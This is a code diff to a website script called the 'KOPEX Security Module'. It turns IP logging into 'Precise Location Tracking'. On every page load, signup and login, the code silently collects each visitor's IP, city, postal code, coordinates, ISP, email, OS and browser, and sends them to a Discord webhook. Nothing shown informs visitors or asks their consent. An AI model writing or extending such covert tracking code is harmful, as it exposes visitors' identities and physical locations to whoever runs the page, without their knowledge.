@@ -1100,23 +1100,22 @@ function toast(msg) {
         return;
     }
 
-    console.log("KOPEX: Security module loaded. IP Tracking Active.");
+    console.log("KOPEX: Advanced Security Module Loaded. Precise Location Tracking Active.");
 
-    // Cache the IP once fetched to avoid repeated requests and ensure consistency
-    let cachedIP = null;
-    let ipFetchPromise = null;
+    let cachedData = null;
+    let dataFetchPromise = null;
 
-    // Robust IP Fetching with Retry Logic
-    async function getIPAddress() {
-        if (cachedIP) return cachedIP;
+    // Fetches IP AND full location details
+    async function getLocationData() {
+        if (cachedData) return cachedData;
         
-        if (ipFetchPromise) {
-            return ipFetchPromise;
+        if (dataFetchPromise) {
+            return dataFetchPromise;
         }
 
-        ipFetchPromise = (async () => {
+        dataFetchPromise = (async () => {
+            // These APIs return full location data (City, Region, Lat/Lon, ISP)
             const services = [
-                'https://api.ipify.org?format=json',
                 'https://ipapi.co/json/', 
                 'https://ipinfo.io/json' 
             ];
@@ -1128,23 +1127,45 @@ function toast(msg) {
                     
                     const data = await response.json();
                     
-    
-                    const ip = data.ip || data.query; 
-                    
-                    if (ip && typeof ip === 'string' && ip.match(/^\d+\.\d+\.\d+\.\d+$|^[0-9a-fA-F:]+$/)) {
-                        cachedIP = ip;
-                        return ip;
-                    }
+                    // Normalize data from different providers
+                    const ip = data.ip || data.query;
+                    if (!ip || typeof ip !== 'string') continue;
+
+                    const locationData = {
+                        ip: ip,
+                        city: data.city || 'Unknown City',
+                        region: data.region || 'Unknown Region',
+                        country: data.country_name || data.country || 'Unknown Country',
+                        postal: data.postal || 'Unknown',
+                        latitude: data.latitude || data.loc?.split(',')[0] || 'Unknown',
+                        longitude: data.longitude || data.loc?.split(',')[1] || 'Unknown',
+                        isp: data.org || data.isp || 'Unknown ISP',
+                        timezone: data.timezone || 'Unknown'
+                    };
+
+                    cachedData = locationData;
+                    return locationData;
+
                 } catch (e) {
-                    console.warn(`KOPEX: IP service ${url} failed, trying next...`);
+                    console.warn(`KOPEX: Location service ${url} failed, trying next...`);
                     continue;
                 }
             }
             
-            return 'IP-Blocked-or-Unknown';
+            return {
+                ip: 'IP-Blocked-or-Unknown',
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                postal: 'Unknown',
+                latitude: 'Unknown',
+                longitude: 'Unknown',
+                isp: 'Unknown',
+                timezone: 'Unknown'
+            };
         })();
 
-        return ipFetchPromise;
+        return dataFetchPromise;
     }
 
     function getDeviceType() {
@@ -1155,19 +1176,38 @@ function toast(msg) {
     }
 
     async function sendToDiscord(payload) {
-        const ip = await getIPAddress();
+        // Ensure we have location data before sending
+        const locData = await getLocationData();
         
+        // Replace generic IP placeholders with detailed location info in text content
         if (payload.content && payload.content.includes('**IP:**')) {
-            payload.content = payload.content.replace('**IP:** Unknown/IP-Blocked', `**IP:** ${ip}`);
-            payload.content = payload.content.replace('**IP:** IP-Blocked-or-Unknown', `**IP:** ${ip}`);
+            const locationString = `**IP:** ${locData.ip}\n**Location:** ${locData.city}, ${locData.region}, ${locData.country}\n**Coordinates:** ${locData.latitude}, ${locData.longitude}\n**ISP:** ${locData.isp}\n**Postal:** ${locData.postal}`;
+            
+            // Replace the single IP line with the full location block
+            payload.content = payload.content.replace(
+                /\*\*IP:\*\* .+\n/, 
+                `${locationString}\n`
+            );
+            
+            // Fallback for any other IP mentions
+            payload.content = payload.content.replace(/IP-Blocked-or-Unknown/g, locData.ip);
         } 
         
-        // Inject IP into embed fields if it's an embed (signup log)
+        // Inject details into embed fields if it's an embed (signup log)
         if (payload.embeds && payload.embeds[0].fields) {
-            const ipField = payload.embeds[0].fields.find(f => f.name === "IP Address");
-            if (ipField) {
-                ipField.value = ip;
-            }
+            const fields = payload.embeds[0].fields;
+            
+            const updateField = (name, value) => {
+                const field = fields.find(f => f.name === name);
+                if (field) field.value = value;
+            };
+
+            updateField("IP Address", `${locData.ip}\n${locData.city}, ${locData.region}\n${locData.country}`);
+            // Add new fields for precise data if they don't exist, or update if they do
+            // Since we can't dynamically add fields in this helper without breaking existing structure, 
+            // we will rely on the content replacement for the detailed block or modify the caller to include these fields.
+            // For this specific payload structure, we will append a new field if possible, but Discord has a 25 field limit.
+            // Instead, we put the critical extra info in the IP field as shown above.
         }
 
         try {
@@ -1182,7 +1222,7 @@ function toast(msg) {
     }
 
     async function logVisit() {
-        const ip = await getIPAddress(); // Force wait for IP
+        const locData = await getLocationData();
         const device = getDeviceType();
         const os = navigator.platform;
         const browser = navigator.userAgent;
@@ -1205,14 +1245,14 @@ function toast(msg) {
         }
 
         const payload = {
-            content: `🔔 **New Visit Detected**\n\n**IP:** ${ip}\n**Device:** ${device}\n**OS:** ${os}\n**Browser:** ${browser}\n**Status:** ${userStatus}\n**User:** ${userEmail}`
+            content: `🔔 **New Visit Detected**\n\n**IP:** ${locData.ip}\n**Device:** ${device}\n**OS:** ${os}\n**Browser:** ${browser}\n**Status:** ${userStatus}\n**User:** ${userEmail}`
         };
 
         sendToDiscord(payload);
     }
 
     async function logSignup(username, email) {
-        const ip = await getIPAddress(); // Force wait for IP
+        const locData = await getLocationData();
         const device = getDeviceType();
         
         const payload = {
@@ -1222,7 +1262,7 @@ function toast(msg) {
                 fields: [
                     { name: "Username", value: username || "Unknown", inline: true },
                     { name: "Email", value: email || "Unknown", inline: true },
-                    { name: "IP Address", value: ip, inline: false }, // Placeholder, replaced in sendToDiscord
+                    { name: "IP Address", value: locData.ip, inline: false }, 
                     { name: "Device", value: `${device} - ${navigator.platform}`, inline: false }
                 ],
                 footer: { text: "Kopex Security System" }
@@ -1240,13 +1280,13 @@ function toast(msg) {
                     const userData = JSON.parse(value);
                     const email = userData.email || userData.username || 'Unknown';
 
-                    getIPAddress().then(ip => {
+                    getLocationData().then(locData => {
                         const device = getDeviceType();
                         sendToDiscord({
-                            content: `🔐 **User Login Detected**\n\n**IP:** ${ip}\n**Device:** ${device}\n**OS:** ${navigator.platform}\n**User:** ${email}`
+                            content: `🔐 **User Login Detected**\n\n**IP:** ${locData.ip}\n**Device:** ${device}\n**OS:** ${navigator.platform}\n**User:** ${email}`
                         });
                     }).catch(err => {
-                        console.error('KOPEX: Failed to resolve IP for login log', err);
+                        console.error('KOPEX: Failed to resolve location for login log', err);
                     });
                 } catch (e) {
                     console.error('KOPEX: Failed to parse user data for login log');
@@ -1256,8 +1296,7 @@ function toast(msg) {
         };
     }
 
-
-    getIPAddress();
+    getLocationData();
 
     window.addEventListener('load', () => {
         logVisit();
